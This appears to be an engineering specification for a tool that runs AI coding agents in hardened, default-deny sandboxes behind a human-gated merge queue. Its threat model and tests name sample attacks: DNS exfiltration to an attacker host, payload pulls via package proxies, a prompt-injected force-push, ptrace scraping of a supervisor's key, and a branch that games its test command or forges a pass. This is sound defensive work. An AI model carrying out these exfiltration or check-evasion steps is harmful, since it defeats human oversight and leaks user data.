### Rejection triggers

- A second copy of token-scrub logic (reuse/move the existing one).
- Health check called on the UI thread or without cancellation.
- Any `llm_*` value readable from `UserPreferences`/`config.json`.

### Reviewer verification script

```bash
dotnet test --filter "FullyQualifiedName~ApiKeyHealth|FullyQualifiedName~CredentialInjector|FullyQualifiedName~SecureKeyStore"
grep -rn "llm_" Mainguard.App.Shell/ | grep -i "preferences\|settings.json"   # 0 hits
```

**Required tests:** health-check parser fixtures (valid + 401 + missing headers, per provider); ceiling table; injector purity + newline rejection; keystore round-trip through the new interface; VM test: invalid key → not stored (keyring dir empty).

---

## P2-02 — `Mainguard.Server` daemon + gRPC v1 contract (G-7.0)

**Milestone:** M6 · **Priority:** P0 · **Depends on:** nothing.

### Why

Every Phase-7 feature needs a process to live in: a headless daemon that owns containers, PTYs, VM worktrees, the merge queue, the gateway, and (in the VM) its own SQLite. The UI becomes a gRPC client for agent features; existing local-repo Git features stay in-process.

### Contract

New projects `Mainguard.Server` (ASP.NET Core gRPC host, linux-x64 publish) and `Mainguard.Protos` (proto-first, `Grpc.Tools` codegen, consumed by Server and App). Package `mainguard.v1`, services:

- `AgentService`: `SpawnAgent`, `StopAgent`, `ListAgents`, `StreamAgentEvents` (server-stream).
- `TerminalService`: `Attach(agentId)` bidi stream; the output frame is `oneof { bytes raw; GridUpdate grid; }` **from day one** (P2-18 must not be a proto break).
- `RepoSyncService`: `ProvisionRepo`, `CreateWorktree`, `ListWorktrees`, `RemoveWorktree` (bodies land in P2-06; the RPCs and typed `UNIMPLEMENTED` stubs land here).
- `GatewayService`: `GetBudgets`, `SetBudgets`, `StreamSpend` (bodies in P2-08).

Client side: `Mainguard.App.Shell/Services/DaemonClient.cs` — channel creation, token metadata, reconnect-with-backoff, `IObservable`-style connection state the Activity Bar renders.

### Implementation steps

1. Add the two projects to `Mainguard.slnx`; protos compile into both; `dotnet build` stays green from the first commit.
2. **Auth:** on startup the daemon writes a random 256-bit session token to a file readable only by the user, prints nothing; an interceptor requires it as `authorization: bearer <token>` metadata on every call; everything else → `PERMISSION_DENIED`. Bind `127.0.0.1` only.
3. **`--local-dev` flag:** daemon runs directly on Windows/localhost (no WSL) for the dev loop and CI.
4. **Logging interceptor** with a secret field-mask (G-13): proto fields commented `// SECRET` are registered in a mask table and never logged.
5. `DaemonClient` with reconnect/backoff + connection-state stream; a `Connected/Degraded/Down` enum consumed by the UI later (P2-13).

### Edge-case matrix

| Case | Required behavior |
|---|---|
| missing/wrong token | `PERMISSION_DENIED`, connection not degraded into a retry storm |
| daemon restart mid-stream | client reconnects with backoff; `StreamAgentEvents` resumes |
| port already bound | typed startup failure naming the port |
| token file deleted while running | existing channels keep working; new client launch regenerates on daemon restart |

### Invariants (MUST)

1. Every RPC authenticated by the interceptor — no allowlist of "public" methods.
2. Daemon binds loopback only (assert in an integration test on the listening endpoint).
3. Proto files carry no OS paths in client-facing messages except opaque handles (G-14).
4. The daemon builds and runs on both linux-x64 and Windows (`--local-dev`); CI exercises the latter.

### Rejection triggers

- Business logic in gRPC service classes beyond validation/dispatch (logic goes in `Mainguard.Agents`/daemon services so it is unit-testable).
- Client code referencing server-only assemblies.
- Any RPC without a deadline/cancellation path.

**Required tests:** in-proc daemon (`WebApplicationFactory`) — authenticated call OK, wrong token `PERMISSION_DENIED`; terminal bidi echo; reconnect resumes event stream; logging mask test (a `// SECRET` field never appears in captured logs).

---

## P2-03 — Terminal engine, interim: PTY shim + vendored renderer (G-7.1a)

**Milestone:** M6 · **Priority:** P0 · **Depends on:** P2-02. **Gated by:** P2-04 from day one.

### Contract

```csharp
// Mainguard.Agents/Agents/PtyProcessShim.cs
public sealed class PtySession : IDisposable
{
    public Stream IO { get; }
    public void Resize(int cols, int rows);
    public void Kill();
    public Task<int> ExitCode { get; }
}
public static class PtyProcessShim
{
    public static PtySession Spawn(string command, IReadOnlyList<string> args, string cwd,
        IReadOnlyDictionary<string, string> env, int cols, int rows);
}

// Mainguard.Agents/Terminal/ITerminalView.cs
public interface ITerminalView
{
    void FeedOutput(ReadOnlyMemory<byte> data);
    event Action<byte[]>? InputAvailable;
    void Resize(int cols, int rows);
    object GetStateSnapshot();
    void RestoreState(object snapshot);
}

// Mainguard.Agents/Terminal/VtBoundaryDetector.cs (pure)
public sealed class VtBoundaryDetector
{
    /// <summary>Returns the largest prefix length of <paramref name="buffer"/> that ends on a
    /// VT-sequence and UTF-8 codepoint boundary; bytes beyond it are held for the next frame.</summary>
    public int SafeFlushLength(ReadOnlySpan<byte> buffer);
}
```

Daemon side: `TerminalStreamer` — PTY bytes pooled, flushed every 16 ms as one gRPC `raw` frame, never splitting a VT sequence or UTF-8 codepoint (holdback cap 4 KB, then flush regardless).

### Implementation steps

1. PTY shim over `Porta.Pty` — ConPTY on Windows (dev loop), forkpty on Linux (daemon). `cwd` locked to the agent worktree.
2. `VtBoundaryDetector`: state machine Ground/Esc/CSI/OSC/DCS/SS3 + UTF-8 continuation counting.
3. `TerminalStreamer`: `ArrayPool<byte>` buffers, 16 ms ticker, detector-guarded flush.
4. Vendor `Iciclecreek.Avalonia.Terminal` into `external/` (license retained), adapt behind `ITerminalView`.
5. `TerminalViewModel` + `TerminalView`: keystrokes (incl. 0x03) → input stream; resize propagates; 60 FPS dirty-flag invalidation; 10k-line circular scrollback.

### Edge-case matrix

| Case | Required behavior |
|---|---|
| frame boundary lands mid-CSI / mid-OSC / mid-emoji | detector holds the tail; reassembly byte-identical |
| malformed endless escape | 4 KB holdback cap flushes anyway |
| `yes | head -c 100M` | memory flat (pooled buffers + scrollback cap) |
| Ctrl+C | 0x03 reaches the PTY; foreground process interrupts |
| resize while streaming | no torn frames, TUI reflows |

### Invariants (MUST)

1. `isatty()` is true inside the PTY (probe test).
2. Detector is pure and exhaustively tested (every fixture sequence split at **every** byte offset).
3. No terminal logic in code-behind; the renderer sits behind `ITerminalView` so P2-18 swaps engines without ViewModel changes.

### Rejection triggers

- Raw `Process` with redirected pipes standing in for a PTY.
- Renderer APIs leaking into ViewModels (breaks the P2-18 swap).

**Required tests:** detector split-at-every-offset corpus (CSI SGR, OSC 8 both terminators, DCS, 2/3/4-byte UTF-8, ZWJ emoji); `/bin/cat` echo round-trip; curses probe; scrollback cap.

---

## P2-04 — VT conformance & replay harness (G-7.1c)

**Milestone:** M6 · **Priority:** P0 — starts alongside P2-03 and gates it and P2-18. · **Depends on:** P2-03 interfaces.

Contract summary (v1-strategy §G-7.1c verbatim, binding): `vttest`/`esctest` scripted headless with a checked-in known-failures allowlist (progress monotonic); golden transcripts under `Mainguard.Tests/Transcripts/` (Claude Code, OpenCode, vim, htop 60 s, tmux) replayed byte-order-only and compared cell-by-cell against committed goldens; required coverage matrix — alternate screen, DEC 2026 synchronized output, truecolor, CJK/emoji width, bracketed paste, mouse reporting, OSC 8 hyperlinks; harness drives **both** engines through a "feed bytes → read grid" abstraction (P2-03's control gains a test-only grid-readback hook).

**Invariants:** regenerating any golden locally is byte-identical (determinism); the allowlist only ever shrinks (CI diff check).
**Rejection triggers:** timing-dependent replays; goldens regenerated wholesale in a PR without justification.
**Required tests:** the harness *is* the deliverable — red/green on the interim engine with the allowlist checked in.

---

## P2-05 — `MainguardOS` bootstrapper (G-7.2a)

**Milestone:** M6 · **Priority:** P0 · **Depends on:** P2-02 (daemon to launch); installer payload arrives with P2-21.

Contract summary (strategy §G-7.2a, binding): `MainguardOsBootstrapper` (client-side) — detect `MainguardEnv` via `wsl.exe --list --quiet`; import from versioned tarball if absent; **merge, never clobber** `%UserProfile%\.wslconfig` (INI parse, add only our keys under `[wsl2]`, back up first; defaults `memory=min(50% RAM, 8GB)`, `autoMemoryReclaim=gradual`); first-boot: raise `fs.inotify.max_user_watches`, **set `kernel.yama.ptrace_scope=2` VM-wide** (the non-namespaced sysctl the P2-07 G2 quartet's control (2) depends on — via `/etc/sysctl.d` or the `/etc/wsl.conf` boot command; it cannot be a per-container flag), start `dockerd` via `/etc/wsl.conf` boot command, wait for the socket; launch `mainguardd`, health-check gRPC, staged-checklist progress UI; **idempotent** — every step checks-then-acts, partial bootstrap resumes.

**Edge cases:** existing user `.wslconfig` keys preserved (fixture-tested INI merger); `wsl --terminate` mid-bootstrap → next start resumes; WSL not installed → actionable failure (P2-21 owns enablement).
**Invariants:** never `wsl --shutdown` (G-12); re-run is a no-op; other distros untouched (uninstall test).
**Required tests:** INI-merger fixtures; state-machine unit tests per step (check/act seams mocked); **`kernel.yama.ptrace_scope ≥ 2` asserted in the VM after boot** (the P2-07 quartet's boot-provisioned control (2)); manual matrix in the PR (fresh import < 60 s, `docker info` green inside the VM, kill-VM recovery).

---

## P2-06 — Repo provisioner: the Git-native sync boundary (G-7.2b)

**Milestone:** M6 · **Priority:** P0 — the data path every agent depends on · **Depends on:** P2-02, P2-05.

### Contract

```csharp
// daemon-side Mainguard.Agents/Agents/RepoProvisioner.cs
public sealed record ProvisionResult(string RepoHash, string BareRepoPath, string VmRemoteUrl);
public interface IRepoProvisioner
{
    ProvisionResult Provision(string windowsRepoPathNormalized);   // clone-or-fetch the ext4 bare mirror
}
// daemon-side WorktreeManager.cs
public interface IAgentWorktreeManager
{
    string CreateAgentWorktree(string repoHash, string agentId);   // branch agent/<id> from main + worktree
    void RemoveAgentWorktree(string repoHash, string agentId, bool force);
    void Prune(string repoHash);
}
```

Windows side: on project open, register the daemon-owned quarantine **sync remote** — its *role* is fixed (the one host-side remote that fetches agent branches) but its *name* is the resolved `SyncRemote.Name` from `IAgentEnvironment.ResolveSyncRemote(repoHash)` (ESC B1 decision SC-2), **defaulting to `mainguard-vm` on the WSL2 substrate** (`mainguard-cloud` on cloud — P2-25) → `\\wsl.localhost\MainguardEnv\...\repos\<hash>.git` (idempotent; via existing `AddRemote`, registering whatever `SyncRemote.Name` resolves to, never a hardcoded literal).

### Implementation steps

1. `<hash>` = SHA-256 of the normalized Windows repo path → `~/mainguard/repos/<hash>.git`; first provision `git clone --bare /mnt/c/...` (9P acceptable for object transfer only — file *watching* over 9P is what's forbidden), subsequent `git fetch`.
2. `core.untrackedCache=true` in the bare template; worktrees under `~/mainguard/worktrees/<repo>/<agentId>` on branch `agent/<id>`.
3. All git via the F2 runner compiled into the daemon (same `RunGit` family, same redaction).
4. `pnpm install` post-worktree when `pnpm-lock.yaml` exists (content-addressable store → N agents ≈ 1× disk).
5. Expose through `RepoSyncService` (replaces the P2-02 stubs).

### Edge-case matrix

| Case | Required behavior |
|---|---|
| second provision of the same repo | incremental fetch, no re-clone (test measures) |
| Windows repo path with spaces/Unicode | hash + UNC registration correct |
| worktree add on an already-used agent id | typed failure |
| bare repo manually deleted | next provision re-clones cleanly |
| `RemoveAgentWorktree(force: false)` on a dirty worktree | typed failure; `force: true` succeeds |

### Invariants (MUST)

1. **G-11:** no container ever mounts a Windows path — the ext4 worktree is the only mount source (asserted in P2-07's inspect test, plumbed here).
2. An agent commit in the VM worktree reaches the Windows repo byte-identically via `git fetch <SyncRemote.Name> && git merge agent/<id>` (the resolved name — `mainguard-vm` on WSL2, per SC-2; round-trip test).
3. Provisioner and worktree manager are daemon services with no UI dependencies.

### Rejection triggers

- Any bind mount of `/mnt/c` into agent-visible paths.
- Worktrees on the Windows filesystem "temporarily".

**Extension (2026-07-07) — quarantine remotes (novel):** each agent worktree's `origin` is the daemon-owned bare repo and **only** that — `git push` from inside the sandbox always works (agent UX intact), but promotion to the real remote happens exclusively via the verified pipeline (P2-10/P2-12 paths on the Windows side). A prompt-injected `git push --force origin main` is structurally impossible, not merely firewalled. Invariant: no agent container ever holds credentials for, or a route to, the user's real remote; test asserts the sandbox's configured remotes.

**Required tests (Linux CI):** provision → bare exists; incremental second run; worktree add/remove/prune round-trip; Windows↔VM commit round-trip (fixture repos both sides); path-with-spaces.

---

## P2-07 — Sandbox hardening + default-deny egress (G-7.2c)

**Milestone:** M6 · **Priority:** P0 launch-tier security — the primary prompt-injection exfiltration control · **Depends on:** P2-05, P2-06.

Contract summary (strategy §G-7.2c, binding — plus market promotion to launch tier): `SandboxEngine` (Docker.DotNet `CreateContainerAsync`): static base image with Nix/Devbox (**no runtime `docker build`**, G-16); `no-new-privileges`, userns remap, default seccomp, memory+pids limits, worktree mount from ext4 only, tmpfs `/dev/shm` for credentials (P2-01 injector content, mode 0400) — with the OOB session HMAC key **K** on a **separate** tmpfs file **mode 0400 owned by a dedicated *supervisor uid* distinct from the agent-CLI uid** (per OPS decision C / G2, §6.1), read-only rootfs where tolerated. `EgressProxyConfigurator`: internal network whose only route out is a proxy container; default-deny; allowlist = model APIs + package registries (pull-only by protocol: crates / Go proxy / npm). **The repo's git host is removed from the *agent* proxy's allowlist (per OPS decision A6, §3.7)** — git-sourced package installs (`pip install git+https://…`, Go modules, git submodules) instead reach the host through a **daemon-mediated read-only git proxy**: an internal endpoint that performs `fetch`/`clone` daemon-side (or via a caching mirror) for **allowlisted host+org prefixes only** and **refuses `push`/`receive-pack` entirely** (this beside the P2-06 provisioner). Every proxied fetch is a P2-17 transparency line; every *attempted* push is denied and audited (feeds P2-44). DNS pinned to the proxy; `HTTP(S)_PROXY` env **and** iptables DROP on direct egress. Per-repo persistent jail (`docker start` if stopped). Allowlist user-visible/editable; changes logged (feeds P2-17).

**Edge cases:** allowlisted `curl https://api.anthropic.com` succeeds via proxy; `curl https://example.com` fails fast (refused, not timeout); direct-IP egress fails; DNS exfil (`dig x.attacker.tld`) fails; `devbox add jq` during a live PTY session survives. **A6 git-proxy:** a `pip install git+https://<allowlisted-host>/<allowlisted-org>/repo` fetch succeeds *through the daemon read-git-proxy*; a direct `git clone https://<git-host>/…` from the agent (bypassing the proxy) fails fast (git host is no longer on the agent allowlist); a `git push`/`receive-pack` through the proxy is refused and audited; a fetch of a non-allowlisted host+org prefix through the proxy is refused. **G2 quartet:** from the agent uid, an attempt to read K from the tmpfs file fails (0400 + supervisor uid), and an attempt to scrape K from the supervisor's process memory via `ptrace`/`process_vm_readv` is denied (yama `ptrace_scope` + seccomp denylist + no `CAP_SYS_PTRACE`) — the agent obtains zero key bytes.
**Invariants:** G-11/G-15/G-16; every verification bullet evidenced in the PR description; credential tmpfs is per-agent — no `~/.claude`/global auth-dir mounts, ever.
- **A6 no-direct-git-host egress (per OPS decision A6, §3.7 / S-1):** the *agent* proxy allowlist contains no git-host entry; the daemon read-git-proxy is the only path to the git host for installs, is prefix-allowlisted, and refuses `push`/`receive-pack` structurally (no push code path). Verification bullet: proxy config shows no git-host allow entry; a push through the proxy returns a refusal + audit event. **Package-proxy caveat (OPS SA-1 / F5): "pull-only" ≠ "cannot fetch attacker code" ≠ "cannot exfil".** A directly-allowlisted language proxy (Go proxy, npm, crates) is a general-purpose fetch channel to arbitrary upstream repos — `GOPROXY` resolves `go get github.com/attacker/payload` (second-stage payload) and leaks bytes in the request path — so removing the git host does not by itself close payload-pull/request-path exfil. **Prefer routing module fetches through the same declared-dependency-scoped daemon proxy** (resolve `go.mod`/`package.json`/lockfiles to exact modules, deny the rest) rather than allowlisting the registries wholesale; where a native proxy front cannot be replaced, every package-proxy fetch is a P2-17 transparency line + P2-44 anomaly signal, and the residual (public-payload pull + low-bandwidth exfil via an allowlisted registry) is accepted-and-stated, bounded by no-push/no-creds and the verify→review→human-merge backstop. Verification bullet: `go get`/npm of a non-declared VCS dependency is scoped-out (declared-dep proxy) or surfaces as a transparency line + anomaly, never silent (`PackageProxy_ArbitraryVcsFetch_ShouldBeScopedOrTransparencyLogged`).
- **G2 anti-memory-inspection quartet (per OPS decision C / G2, §6.1; G-13/G-15; OPS S-6/S-9):** the A1 forgery-[STRUCT] guarantee depends on the agent uid being unable to obtain the OOB HMAC key **K** by *any* path, so the spec MUST carry all four together — (1) the K/credential tmpfs is mode 0400 owned by a dedicated *supervisor uid* ≠ the agent-CLI uid **[per-container]**; (2) yama `kernel.yama.ptrace_scope` ≥ 2 **[VM-wide boot sysctl — see the placement note below]**; (3) a seccomp profile denying `process_vm_readv`/`process_vm_writev`/`ptrace` to the sandbox **[per-container]**; (4) no `CAP_SYS_PTRACE` in the agent's capability set **[per-container]**. **The in-container memory-scrape is closed structurally by (3)+(4) alone** — a container-wide seccomp denial of `process_vm_readv`/`ptrace` plus the dropped capability leaves the agent no syscall to read the supervisor's memory; (1) closes the file path. **Control (2) is defense-in-depth and is NOT a per-container flag:** `kernel.yama.ptrace_scope` is a non-namespaced kernel sysctl and cannot be set via `CreateContainerAsync`/`--sysctl` (Docker permits only namespaced sysctls); it MUST be provisioned **VM-wide at boot by the P2-05 bootstrapper** (alongside `fs.inotify.max_user_watches`), never asserted on the container create request. Dropping (1), (3), or (4) regresses S-9's forgery-[STRUCT] and S-6; (2) hardens it. Verification bullets: the spec builder asserts (1), (3), (4) on the create request; a **VM boot check** asserts `kernel.yama.ptrace_scope ≥ 2`; a live agent-uid `ptrace`/`process_vm_readv` against the supervisor is denied.
**Acceptable variations (MAY):** offering **Docker Sandboxes (sbx)** as an optional "maximum isolation" backend behind the same `SandboxEngine` interface (microVM + its Locked-Down egress preset, GA on Windows since 2026-01) — the native WSL2 path stays the zero-extra-install default, and the egress/audit invariants apply to both backends.
**Rejection triggers:** proxy-env-only enforcement (no iptables backstop); a "temporary" `--privileged`; making sbx a hard dependency.
**Required tests:** container-spec builder unit tests (per-container flags asserted on the create request — the seccomp `process_vm_readv`/`process_vm_writev`/`ptrace` denylist, no `CAP_SYS_PTRACE`, and supervisor-uid ownership of the K/credential tmpfs) **plus a P2-05 VM-boot assertion that `kernel.yama.ptrace_scope ≥ 2`** (the non-namespaced sysctl the builder cannot set); egress matrix as an integration suite tagged `RequiresDocker`; `docker inspect` assertions (no Windows paths, userns, limits). **A6 read-git-proxy suite** (`RequiresDocker`): allowlisted-prefix `fetch`/`clone` via the daemon proxy succeeds; `push`/`receive-pack` through the proxy is refused + audited; a non-allowlisted host+org prefix is refused; a direct git-host `clone` from the agent (bypassing the proxy) fails fast (git host absent from the agent allowlist). **G2 key-custody test** (`RequiresDocker`, mirrors OPS §9 test 13 `SupervisorMemory_NotReadableByAgent_ViaPtraceOrVmRead`): from the agent uid, reading K from the tmpfs file AND scraping it from supervisor process memory (`ptrace`/`process_vm_readv`) are **both denied** — the agent obtains zero key bytes.

---

## P2-08 — AI Gateway + admission control + swarm reconciler (G-7.2d) — **launch-blocking**

**Milestone:** M6 exit · **Priority:** P0 (market: without it the first session of the headline feature is a retry storm) · **Depends on:** P2-01, P2-07.

### Contract

```csharp
// daemon Mainguard.Agents/Agents/AiGateway.cs
public interface IAiGateway
{
    Task<GatewayLease> AcquireAsync(string agentId, int estimatedTokens, CancellationToken ct); // FIFO within priority
    void Report429(string agentId, TimeSpan? retryAfter);
    GatewaySnapshot GetSnapshot();      // per-agent spend, queue depth, current limits
}
// AdmissionController.cs: bool CanSpawn(out string reason)  — VM memory sampled ≤5s, threshold default 85%
// SwarmReconciler.cs: reconcile Docker (sole source of truth — no lockfiles) against expected agents on boot
```

### Implementation steps

1. Token-bucket (requests + tokens/min seeded from the P2-01 health check), FIFO queue per priority class; leases released on completion with actuals.
2. **429 interception:** the model host is only reachable via the egress proxy route that the gateway fronts; on 429/`Retry-After` → pause the worker's PTY input, mark `RateLimited`, exponential backoff, resume — the CLI process never sees the 429.
3. Budgets: per-agent/per-day token+cost caps; exhausted → typed rejection surfaced in UI; spend telemetry streamed over `GatewayService`.
4. Admission: `/proc/meminfo` sampling; block spawn above threshold with the honest "4–6 agents on 16 GB" message; headroom in `ListAgents` metadata.
5. Reconciler on daemon boot: dead container → prune worktree, mark `Dead`; orphan live container → adopt-or-stop per policy.

### Edge-case matrix

| Case | Required behavior |
|---|---|
| two agents, one key, sustained load | both proceed, fairness (neither starves), zero CLI crashes |
| 429 with `Retry-After: 5` | worker paused, resumes ≈5 s, CLI saw a delayed 200 |
| budget exhausted mid-task | agent paused with a typed reason, not killed |
| daemon reboot with 3 live containers, 1 dead | reconcile adopts 3, prunes 1, UI shows `Dead` disposal |
| memory ≥ threshold | spawn rejected with typed reason; existing agents unaffected |

### Invariants (MUST)

1. No agent process ever observes a raw 429 (integration-asserted with a fake model endpoint).
2. Bucket math is pure and property-tested (burst, refill, fairness).
3. Reconciler trusts Docker state only — PID files/lockfiles are a rejection trigger.

**Required tests:** bucket/backoff/budget unit suites; fake-429 endpoint integration; memory-pressure simulated spawn rejection; out-of-band `docker rm` → boot reconcile outcome.

---

## P2-09 — Agent lifecycle: cooperative yield + keep-alive rebase (G-7.3 part 1)

**Milestone:** M7 · **Priority:** P0 · **Depends on:** P2-06, P2-07.

Contract summary (strategy §G-7.3 steps 1–2, 7–8, binding): **Cooperative Yield Protocol** — `[IPC_UPDATE_REQUESTED]` to the agent's control channel, await `[IPC_UPDATE_READY]` (timeout → `docker pause`); only then touch the worktree; guard every Git mutation (abort if mid-rebase or detached HEAD; exponential-backoff retry on `index.lock`). **Keep-alive rebase** — yield → `add -A && commit -m "wip: sync" && rebase main` → resume; conflicts → status `Conflict` + route to the T-04 resolver against the worktree. **Session durability** — PTYs under a persistent session leader in the VM; daemon restart reattaches (leader registry reconciled like P2-08). **Teardown** — `IDisposable` agent context: kill PTY, `worktree remove --force`, `branch -D agent/<id>`, close floating dock windows; filesystem verified clean.

**Edge cases:** yield timeout → pause path exercised; keep-alive with agent mid-`git rebase` of its own → skipped (guard) and retried next cycle; leader survives daemon kill -9 (reattach test).
**Invariants:** the human's live edits reach agent worktrees only via Git (keep-alive rebase), never file sync; no Git mutation while the agent is unpaused/unyielded.
**Rejection triggers:** touching a worktree without a completed yield; polling `ps` for agent liveness (Docker is truth).
**Required tests:** scripted-container yield round-trip; keep-alive conflict → `Conflict` status; teardown residue check (`git worktree list` + `docker ps -a` clean); leader reattach.

**Extension (2026-07-07):** adapter-crash **forensic resume** — on CLI death the daemon snapshots state and offers reconstructed-context resume; specified in P2-37 step 4 (this task provides the yield/leader plumbing it rides on).

---

## P2-10 — Merge queue + verification runs + stale invalidation (G-7.3 part 2 + market D-1) — **the product spine**

**Milestone:** M7 · **Priority:** P0 — this is the lead feature per the July-2026 viability research · **Depends on:** P2-09.

**Positioning (vs "just use GitHub's merge queue"):** GitHub's server-side queue is the only shipping stale-invalidation analogue — but it is CI-bound, PR-only, GitHub-hosted, and agent-blind. This queue works **pre-PR, locally, across N agent branches, without CI round-trips, and on any host** — no desktop or orchestration product ships that (verified 2026-07-07).

### Contract

```csharp
// daemon Mainguard.Agents/Agents/Orchestrator/MergeQueue.cs
public enum WorkerMergeState { Working, Verifying, Verified, StaleVerified, AwaitingReview, Merged, Rejected }
public sealed record VerificationRecord(string AgentId, string MainSha, bool Passed, string LogArtifactPath, DateTimeOffset When);
public interface IMergeQueue
{
    WorkerMergeState GetState(string agentId);
    Task<VerificationRecord> RunVerificationAsync(string agentId, CancellationToken ct); // test cmd in the agent's sandbox
    void NotifyMainMoved(string newMainSha);        // marks every Verified worker StaleVerified + auto re-queues
    bool CanMerge(string agentId, out string reason); // false when stale/unverified (settings override, loudly labeled)
}
```

Windows side: `ForegroundMergeService` — "Merge to Main" = `git fetch <SyncRemote.Name> && git merge agent/<id>` on the Windows repo (human-gated, journaled via T-19), where `<SyncRemote.Name>` is the value `IAgentEnvironment.ResolveSyncRemote(repoHash)` returns (per SC-2: `mainguard-vm` on WSL2, `mainguard-cloud` on cloud — **never a hardcoded literal**, so this contract is substrate-agnostic for the P2-25 cloud path). The freshness gate is an A5 **ref-level compare-and-swap** (see the A5 note in invariant 3), not an `index.lock`-scoped read. Post-merge installs run `--ignore-scripts` wrapped in retry (NTFS `EPERM`/`EBUSY`).

### Implementation steps

1. State machine exactly as the enum; transitions persisted (daemon SQLite) so a daemon restart resumes queue state.
2. Verification = the project's configured test command run in the worker's own sandbox, **launched by the daemon itself via the container runtime (`docker exec`) so the pass/fail is the daemon-observed exit code (reported by containerd, outside the in-sandbox `AgentSupervisor`'s control), NOT a value reported over the OOB `VerifyResult` frame** (OPS SA-1 / decision D: the supervisor is not in the TCB and a compromised one could otherwise forge a `Verified` state — the single trust-ending forgery); record `main@<sha> + pass/fail + log artifact`. Note the honest residual: the test still executes against agent-controlled files/deps, so a poisoned test *runner* can exit 0 over failing code (RT-D2 flags command-*text* changes, not the execution closure) — therefore `Verified` is a **quality signal, not a security boundary against an adversarial branch**; the gate against hostile code is human diff review (P2-11).
3. **Stale cascade:** every merge to main → `NotifyMainMoved` → all `Verified` workers flip `StaleVerified` and auto re-enter (yield → keep-alive rebase → re-verify). This loop is the single hardest coordination problem of parallel agents and the moat — it gets the densest tests in the milestone.
4. Merge gating: `CanMerge` false on stale/unverified; the override setting exists but renders a loud warning and is journaled + audited.
5. Rejection path: branch delete, sandbox prune, teardown per policy.
6. Works identically when the "worker" is an external PR intake (P2-12) — the queue keys on a branch, not on a PTY.

### Edge-case matrix

| Case | Required behavior |
|---|---|
| A merges while B and C are `Verified` | B, C → `StaleVerified`, auto re-queue, re-verify against new main |
| verification fails after rebase | worker back to `Working` with the failure surfaced, not silently retried |
| merge attempted on stale verification | blocked; override path logged + audited + labeled |
| daemon restart mid-`Verifying` | run restarts or resumes; state never stuck |
| test command absent | typed "no verification command configured"; merge allowed only with the explicit unverified override |

### Invariants (MUST)

1. A merge through the UI on a fresh `Verified` state is the only silent path; every other path warns and records.
2. Verification results are immutable records tied to a `main@<sha>`; re-verification creates a new record.
3. The human foreground merge happens on the Windows repo via the existing journaled service surface (undoable via T-19). **A5 freshness is a ref-level CAS:** the check that `VerificationRecord.MainSha == main@sha` and the merge are performed as one journaled step using git's own ref old-OID compare-and-swap on `refs/heads/main` (e.g. `git merge --ff-only`/an explicit expected-old-OID `update-ref`), **not** an `index.lock`-scoped read-then-merge — `index.lock` guards the index, not ref updates (`update-ref`/push/fetch can move `main` without it), so only a ref-level CAS closes the TOCTOU (OPS §6.5, corrected).

### Rejection triggers

- Auto-merge of any kind — the human gate is the product thesis.
- Verification run outside the worker's sandbox (host execution).
- **Taking the verification pass/fail from a supervisor-reported `VerifyResult{passed}` frame instead of the daemon-observed container-runtime exit** (OPS SA-1 — a compromised, non-TCB supervisor would forge `Verified`).

**Launch-blocker gates (§3.1, M7 exit):** (RT-D1) reboot reconciliation replays the T-19 Windows-side journal for any repo with an outstanding merge lease and synthesizes the `ConfirmMerge` idempotency record from a committed-but-unrecorded merge **before** a new `BeginMerge` is accepted; (RT-D2) `VerificationRecord` records the resolved test command + a hash of the config that defined it, and a change to that command vs the `main`-side baseline becomes a dedicated must-acknowledge flagged item (wired into P2-11/P2-35) before `CanMerge` is true — a branch cannot self-green by rewriting its test to `exit 0`.

**Required tests:** exhaustive state-machine unit suite incl. the stale cascade + override; two-scripted-worker integration (A merges → B re-verifies → merge button blocked until fresh); restart-resume; `--ignore-scripts` canary (poisoned `postinstall` does not execute); **`DaemonCrashMidMerge_ShouldRecoverToExactlyOnceOrNone` (RT-D1); `GamedTestCommand_ShouldBeFlaggedBeforeSilentMerge` (RT-D2); `ForgedVerifyResult_ShouldBeOverriddenByDaemonObservedExit` (OPS SA-1 / §9 test 14 — a compromised supervisor's forged `passed:true` does not create a `Verified`/mergeable state; PR-blocking on the Docker leg)**.

---

**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §3.** The queue renders as its state machine on the Merge Queue Rail: per-branch state chips naming the `main@sha` each verification ran against, the stale cascade shown as a visible re-verification wave (never a silent reorder), and the `CanMerge` gate surfaced with its reason vocabulary. Empty/loading/error states and badges come from the §9 shared vocabulary.

## P2-11 — Review cockpit: risk-ranked diffs, per-hunk provenance, flagged-changes gate (market D-2)

**Milestone:** M7 · **Priority:** P0 (the daily-driver reason to open Mainguard; review time +91% is the buying trigger) · **Depends on:** P2-10; reuses T-06 `PatchParser`, T-11 blame, T-13 diff stack.

### Contract

```csharp
// Mainguard.Agents/Review/RiskClassifier.cs (pure)
public enum RiskCategory { ExecutableConfig, Lockfile, CiWorkflow, GitHooks, EditorConfig, SecuritySensitivePath, Source, Docs }
public sealed record HunkRisk(RiskCategory Category, int Rank);   // lower rank = review first
public static class RiskClassifier
{
    public static HunkRisk Classify(string filePath, DiffHunk hunk);   // path + content rules
}

// Mainguard.Agents/Review/ProvenanceReader.cs (pure)
public sealed record HunkProvenance(string? Agent, string? Task, string? Plan, string Sha, string Source); // Source: "agent-trace" | "trailer"
public static class ProvenanceReader
{
    /// <summary>Primary: Agent Trace records (the Cognition/Cursor interchange standard —
    /// JSON trace records mapping file/line ranges to contributors). Mainguard both emits them
    /// from the orchestrator and renders them; first review UI to do so.</summary>
    public static IReadOnlyList<HunkProvenance> FromAgentTrace(string traceJson);
    /// <summary>Fallback for non-emitting agents: Agent:/Task:/Plan: commit trailers.</summary>
    public static HunkProvenance? FromTrailers(string commitMessage, string sha);
}

// Mainguard.Agents/Agents/Orchestrator/FlaggedChangeDetector.cs (pure)
public static class FlaggedChangeDetector
{
    /// <summary>Paths/hunks that require explicit acknowledgment before the merge button enables.</summary>
    public static IReadOnlyList<(string Path, RiskCategory Category)> Detect(IReadOnlyList<FilePatch> mergeDiff);
}
```

UI: the agent-branch diff view orders files/hunks by risk rank (not alphabetically); a provenance gutter chip per hunk (agent · task · plan); a pairing-style **\"bring this branch local\"** action (fetch the agent branch into a local worktree via the T-29 plumbing — the hand-back UX Sculptor's Pairing Mode proved); a distinct flagged-changes panel that must be acknowledged item-by-item before `CanMerge` consults it; a test-delta strip (what the P2-10 verification newly covers/failed vs main).

### Implementation steps

1. `RiskClassifier` rules: `package.json` **scripts block** edits (content rule — a dependency bump alone is `Lockfile`, not `ExecutableConfig`), lockfiles, `.github/workflows/`, git hooks, `.vscode/`, path heuristics for security-sensitive code (auth/, crypto/, *Security*).
